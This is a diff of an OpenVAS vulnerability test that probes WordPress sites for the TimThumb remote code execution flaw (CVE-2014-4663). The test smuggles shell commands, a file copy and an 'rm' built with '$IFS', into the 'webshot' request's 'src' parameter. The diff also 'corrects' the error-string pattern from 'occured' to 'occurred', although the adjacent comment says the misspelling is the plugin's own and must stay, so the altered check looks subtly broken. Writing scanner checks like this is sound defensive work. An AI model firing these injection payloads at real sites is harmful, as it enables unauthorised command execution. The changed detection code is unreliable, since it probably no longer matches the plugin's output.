@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wp_timthumb_remote_code_exec_vuln.nasl 10000 2018-05-29 12:20:12Z cfischer $
+# $Id: gb_wp_timthumb_remote_code_exec_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
 #
 # Binary Moon TimThumb Remote Code Execution Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805116");
-  script_version("$Revision: 10000 $");
+  script_version("$Revision: 11402 $");
   script_cve_id("CVE-2014-4663");
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-05-29 14:20:12 +0200 (Tue, 29 May 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-12-23 11:22:48 +0530 (Tue, 23 Dec 2014)");
   script_name("Binary Moon TimThumb Remote Code Execution Vulnerability");
 
@@ -48,9 +48,7 @@ if(description)
   parameter is not properly sanitized.");
 
   script_tag(name:"impact", value:"Successful exploitation will allow remote
-  attackers to execute arbitrary commands.
-
-  Impact Level: Application");
+  attackers to execute arbitrary commands.");
 
   script_tag(name:"affected", value:"Binary Moon TimThumb version 2.8.13,
   prior versions may also be affected.");
@@ -60,13 +58,13 @@ if(description)
 
   script_tag(name:"solution_type", value:"VendorFix");
 
-  script_xref(name : "URL" , value : "http://seclists.org/oss-sec/2014/q2/689");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/33851");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/127192");
-  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2014/Jul/4");
-  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2014/Jun/117");
-  script_xref(name : "URL" , value : "https://code.google.com/p/timthumb/source/detail?r=219");
-  script_xref(name : "URL" , value : "https://code.google.com/p/timthumb/issues/detail?id=485");
+  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2014/q2/689");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/33851");
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127192");
+  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Jul/4");
+  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Jun/117");
+  script_xref(name:"URL", value:"https://code.google.com/p/timthumb/source/detail?r=219");
+  script_xref(name:"URL", value:"https://code.google.com/p/timthumb/issues/detail?id=485");
 
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -75,6 +73,7 @@ if(description)
   script_dependencies("secpod_wordpress_detect_900182.nasl");
   script_mandatory_keys("wordpress/installed");
   script_require_ports("Services/www", 80);
+
   exit(0);
 }
 
@@ -274,11 +273,11 @@ foreach eachVulnPath (vulnPath)
     ## Command to delete the copied file
     delCmd = "/$%28rm$IFS./" + randFile + "%29";
 
-    ## Attack Url to copy timthumb.php
+    ## Command to copy timthumb.php
     cpUrl = dir + eachVulnPath + "?webshot=1&src=http://localhost" + dir + cpCmd;
 
     if(http_vuln_check(port:http_port, url:cpUrl, check_header:FALSE,
-       pattern:">A TimThumb error has occured<", # nb: This is a typo in the TimThumb plugin so don't fix it here...
+       pattern:">A TimThumb error has occurred<", # nb: This is a typo in the TimThumb plugin so don't fix it here...
        extra_check:make_list(">Query String", ">The image being resized is not a valid")))
     {
       cpPath = eachVulnPath - "timthumb.php";
@@ -291,12 +290,12 @@ foreach eachVulnPath (vulnPath)
         security_message(port:http_port);
         log_message(data:'\nVulnerable TimThumb at : '+ dir + eachVulnPath, port:http_port);
 
-        ## Attack Url to remove the copied file
+        ## Command to remove the copied file
         delUrl = dir + eachVulnPath + "?webshot=1&src=http://localhost" + dir + delCmd;
 
-        ## Attack request to run rm command
+        ## Command to run rm command
         if(http_vuln_check(port:http_port, url:delUrl, check_header:FALSE,
-           pattern:">A TimThumb error has occured<", # nb: This is a typo in the TimThumb plugin so don't fix it here...
+           pattern:">A TimThumb error has occurred<", # nb: This is a typo in the TimThumb plugin so don't fix it here...
            extra_check:make_list(">Query String", ">The image being resized is not a valid")))
         {
           if(http_vuln_check(port:http_port, url:cpFileUrl, check_header:FALSE,
